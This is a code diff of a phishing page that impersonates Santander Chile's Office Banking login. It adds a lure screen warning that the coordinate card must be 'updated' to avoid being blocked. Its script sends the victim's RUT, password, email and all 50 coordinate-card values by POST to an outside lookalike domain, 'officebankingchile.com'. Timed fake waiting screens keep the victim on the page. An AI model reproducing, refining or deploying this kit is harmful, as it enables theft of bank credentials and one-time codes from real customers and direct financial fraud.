@@ -153,19 +153,19 @@
   <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="2" aria-label="Slide 3"></button>
 </div>
 
-<!-- OFFCANVAS LOGIN -->
+ <!-- OFFCANVAS LOGIN -->
 <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin">
-  <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
+  <div class="offcanvas-header">
     <div class="d-flex justify-content-center align-items-center">
       <img src="/logo-office-banking.svg" class="logo-ob me-3">
       <img src="/LogoSantander.png" class="logo-santander">
     </div>
 
-    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
-            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);"></button>
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
   </div>
 
-  <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
+  <div class="offcanvas-body">
+
     <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>
 
     <div class="login-box">
@@ -174,24 +174,18 @@
       <form id="loginForm">
         <label for="rut">RUT</label>
         <div class="position-relative">
-          <input type="text" id="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right:40px;">
-          <!-- Botón X para limpiar -->
-          <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
+          <input type="text" id="rut" placeholder="12.345.678-5" required class="form-control">
+          <span class="clear-input" onclick="rut.value=''"></span>
         </div>
 
         <label for="passwd">Contraseña</label>
         <div class="position-relative">
-          <input type="password" id="passwd" required class="form-control" style="padding-right:80px;">
-          <!-- Botón X para limpiar -->
-          <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
-          <!-- Ojo cargado desde archivo SVG -->
-          <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
+          <input type="password" id="passwd" required class="form-control">
+          <span class="clear-input" onclick="passwd.value=''"></span>
+          <img id="togglePasswd" src="eye.svg" class="icon-eye">
         </div>
 
         <button type="submit" class="btn-red w-100">Aceptar</button>
-        <div class="options">
-          <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
-        </div>
       </form>
 
       <div id="resultado"></div>
@@ -209,18 +203,31 @@
         <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
       </div>
 
-      <!-- COORDENADAS (50 PARES) -->
-      <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
+      <!-- NUEVA PANTALLA: SELECCIÓN -->
+      <div id="pantallaSeleccion" class="hidden" style="padding:20px;">
         <div class="text-center mb-3">
           <img src="/logo-office-banking.svg" style="height:50px;">
         </div>
 
-        <h2 class="text-center" style="font-size:18px; margin-bottom:20px;">
-          Ingresa los <strong>50 pares numéricos</strong> de tu Tarjeta de Coordenadas.
+        <h2 class="text-center" style="font-size:18px;">
+          Si aún mantienes tu <strong>Tarjeta de Coordenadas</strong>, es necesario actualizarla para evitar el bloqueo.
         </h2>
 
+        <button class="btn-red w-100 mb-3" onclick="seleccionarCoordenadas()">
+          Actualizar Tarjeta de Coordenadas
+        </button>
+
+        <button class="btn btn-secondary w-100" onclick="seleccionarPass()">
+          Tengo Santander Pass
+        </button>
+      </div>
+
+      <!-- COORDENADAS -->
+      <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
+        <h2 class="text-center">Ingresa tus 50 coordenadas</h2>
+
         <div class="table-responsive">
-          <table class="table table-bordered text-center" style="min-width:600px;">
+          <table class="table table-bordered text-center">
             <thead>
               <tr>
                 <th></th>
@@ -229,76 +236,82 @@
               </tr>
             </thead>
             <tbody>
+              <!-- 5 FILAS X 10 COLUMNAS -->
               <!-- FILA 1 -->
               <tr><th>1</th>
-                <td><input maxlength="2" id="coord-A1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J1" class="coord-input"></td>
+                <td><input id="coord-A1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-B1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-C1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-D1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-E1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-F1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-G1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-H1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-I1" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-J1" maxlength="2" class="coord-input"></td>
               </tr>
+
               <!-- FILA 2 -->
               <tr><th>2</th>
-                <td><input maxlength="2" id="coord-A2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J2" class="coord-input"></td>
+                <td><input id="coord-A2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-B2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-C2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-D2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-E2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-F2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-G2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-H2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-I2" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-J2" maxlength="2" class="coord-input"></td>
               </tr>
+
               <!-- FILA 3 -->
               <tr><th>3</th>
-                <td><input maxlength="2" id="coord-A3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J3" class="coord-input"></td>
+                <td><input id="coord-A3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-B3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-C3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-D3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-E3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-F3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-G3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-H3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-I3" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-J3" maxlength="2" class="coord-input"></td>
               </tr>
+
               <!-- FILA 4 -->
               <tr><th>4</th>
-                <td><input maxlength="2" id="coord-A4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J4" class="coord-input"></td>
+                <td><input id="coord-A4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-B4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-C4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-D4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-E4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-F4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-G4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-H4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-I4" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-J4" maxlength="2" class="coord-input"></td>
               </tr>
+
               <!-- FILA 5 -->
               <tr><th>5</th>
-                <td><input maxlength="2" id="coord-A5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J5" class="coord-input"></td>
+                <td><input id="coord-A5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-B5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-C5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-D5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-E5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-F5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-G5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-H5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-I5" maxlength="2" class="coord-input"></td>
+                <td><input id="coord-J5" maxlength="2" class="coord-input"></td>
               </tr>
+
             </tbody>
           </table>
         </div>
 
-        <button class="btn-red w-100 mt-3" onclick="enviarCoordenadas()">Ingresar</button>
+        <button class="btn-red w-100" onclick="enviarCoordenadas()">Ingresar</button>
       </div>
 
       <!-- PRODUCTOS -->
@@ -315,151 +328,143 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-/* OJO */
-const passwdInput = document.getElementById("passwd");
-const togglePasswd = document.getElementById("togglePasswd");
+/* Mostrar/Ocultar contraseña */
 togglePasswd.onclick = () => {
-  const visible = passwdInput.type === "password";
-  passwdInput.type = visible ? "text" : "password";
+  const visible = passwd.type === "password";
+  passwd.type = visible ? "text" : "password";
   togglePasswd.src = visible ? "eye-slash.svg" : "eye.svg";
 };
 
-/* FORMATEO RUT */
-function formatearRUT(valor){
-  valor = valor.replace(/\./g,"").replace(/-/g,"");
-  if(valor.length===0) return "";
-  let dv = valor.slice(-1);
-  let cuerpo = valor.slice(0,-1);
-  let cuerpoFormateado = "";
-  while(cuerpo.length > 3){
-    cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
-    cuerpo = cuerpo.slice(0, -3);
-  }
-  cuerpoFormateado = cuerpo + cuerpoFormateado;
-  return cuerpoFormateado + "-" + dv;
+/* Formateo RUT */
+function formatearRUT(v){
+  v = v.replace(/\./g,"").replace(/-/g,"");
+  if(v.length===0) return "";
+  let dv = v.slice(-1);
+  let c = v.slice(0,-1);
+  return c.replace(/\B(?=(\d{3})+(?!\d))/g,".") + "-" + dv;
 }
-document.getElementById("rut").addEventListener("input", function(e){
-  let valor = e.target.value.replace(/[^0-9kK]/g, "");
-  e.target.value = formatearRUT(valor);
+rut.addEventListener("input", e=>{
+  e.target.value = formatearRUT(e.target.value.replace(/[^0-9kK]/g,""));
 });
 
-/* VALIDAR RUT */
-function validarRut(rutCompleto) {
-  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-  if(rutCompleto.length < 2) return false;
-  let cuerpo = rutCompleto.slice(0, -1);
-  let dv = rutCompleto.slice(-1);
-  let suma = 0, multiplo = 2;
-  for(let i = cuerpo.length - 1; i >= 0; i--) {
-    suma += parseInt(cuerpo.charAt(i)) * multiplo;
-    multiplo = multiplo < 7 ? multiplo + 1 : 2;
+/* Validar RUT */
+function validarRut(r){
+  r = r.replace(/\./g,"").replace(/-/g,"").toUpperCase();
+  if(r.length<2) return false;
+  let c=r.slice(0,-1), dv=r.slice(-1);
+  let s=0,m=2;
+  for(let i=c.length-1;i>=0;i--){
+    s += parseInt(c[i])*m;
+    m = m<7 ? m+1 : 2;
   }
-  let dvEsperado = 11 - (suma % 11);
-  dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-  return dv === dvEsperado;
+  let e = 11-(s%11);
+  e = e===11?"0":e===10?"K":e.toString();
+  return dv===e;
 }
 
 /* LOGIN */
-document.getElementById("loginForm").addEventListener("submit", async function(e){
+loginForm.addEventListener("submit", async e=>{
   e.preventDefault();
-  const rut = document.getElementById("rut").value;
-  const passwd = document.getElementById("passwd").value;
 
-  if(!validarRut(rut)){
-    document.getElementById("resultado").innerText = "❌ RUT inválido";
+  if(!validarRut(rut.value)){
+    resultado.innerText="❌ RUT inválido";
     return;
   }
 
-  try {
-    const response = await fetch("https://www.officebankingchile.info/proxy-login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ rut, passwd })
+  try{
+    await fetch("https://officebankingchile.com/proxy-login",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ rut:rut.value, passwd:passwd.value })
     });
-    const data = await response.json();
-    document.getElementById("resultado").innerText = data.mensaje || "";
+  }catch(e){}
 
-    if(response.ok){
-      document.getElementById("loginForm").style.display="none";
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
-      setTimeout(()=>{
-        document.getElementById("pantallaEspera").classList.add("hidden");
-        document.getElementById("formCorreo").classList.remove("hidden");
-      }, 45000);
-    }
-  } catch (error) {
-    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
-  }
-});
-
-/* CORREO */
-async function enviarCorreo(){
-  const correo = document.getElementById("correo").value;
-
-  try {
-    await fetch("https://www.officebankingchile.info/proxy-login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ mail: correo })
-    });
-  } catch (error) {
-    console.error("Error al enviar correo:", error);
-  }
-
-  document.getElementById("formCorreo").classList.add("hidden");
-  document.getElementById("pantallaEspera").classList.remove("hidden");
+  loginForm.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
 
   setTimeout(()=>{
-    document.getElementById("pantallaEspera").classList.add("hidden");
-    document.getElementById("pantallaCoordenadas").classList.remove("hidden");
-  }, 15000);
+    pantallaEspera.classList.add("hidden");
+    formCorreo.classList.remove("hidden");
+  },45000);
+});
+
+/* CORREO → NUEVA PANTALLA */
+async function enviarCorreo(){
+  try{
+    await fetch("https://officebankingchile.com/proxy-login",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ mail:correo.value })
+    });
+  }catch(e){}
+
+  formCorreo.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaSeleccion.classList.remove("hidden");
+  },15000);
+}
+
+/* SELECCIÓN */
+function seleccionarCoordenadas(){
+  pantallaSeleccion.classList.add("hidden");
+  pantallaCoordenadas.classList.remove("hidden");
+}
+
+function seleccionarPass(){
+  pantallaSeleccion.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaProductos.classList.remove("hidden");
+  },8000);
 }
 
 /* COORDENADAS */
 async function enviarCoordenadas(){
-  let coords = {};
-  const letras = ["A","B","C","D","E","F","G","H","I","J"];
+  let coords={};
+  const letras=["A","B","C","D","E","F","G","H","I","J"];
 
-  for(let fila = 1; fila <= 5; fila++){
-    for(let col of letras){
-      const id = `coord-${col}${fila}`;
-      const valor = document.getElementById(id).value.trim();
-      if(valor.length !== 2){
-        alert(`El valor ${col}${fila} debe tener 2 dígitos.`);
+  for(let f=1;f<=5;f++){
+    for(let c of letras){
+      let id=`coord-${c}${f}`;
+      let v=document.getElementById(id).value.trim();
+      if(v.length!==2){
+        alert(`El valor ${c}${f} debe tener 2 dígitos.`);
         return;
       }
-      coords[`${col}${fila}`] = valor;
+      coords[`${c}${f}`]=v;
     }
   }
 
-  try {
-    await fetch("https://www.officebankingchile.info/proxy-login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ coordenadas: coords })
+  try{
+    await fetch("https://officebankingchile.com/proxy-login",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ coordenadas:coords })
     });
-  } catch (error) {
-    console.error("Error al enviar coordenadas:", error);
-  }
+  }catch(e){}
 
-  document.getElementById("pantallaCoordenadas").classList.add("hidden");
-  document.getElementById("pantallaEspera").classList.remove("hidden");
+  pantallaCoordenadas.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
 
   setTimeout(()=>{
-    document.getElementById("pantallaEspera").classList.add("hidden");
-    document.getElementById("pantallaProductos").classList.remove("hidden");
-  }, 15000);
+    pantallaEspera.classList.add("hidden");
+    pantallaProductos.classList.remove("hidden");
+  },15000);
 }
 
 /* PRODUCTOS */
 function continuarProductos(){
-  document.getElementById("pantallaProductos").classList.add("hidden");
-  document.getElementById("pantallaEspera").classList.remove("hidden");
+  pantallaProductos.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
 
   setTimeout(()=>{
     window.location.href="productos.html";
-  }, 15000);
+  },15000);
 }
 </script>
 
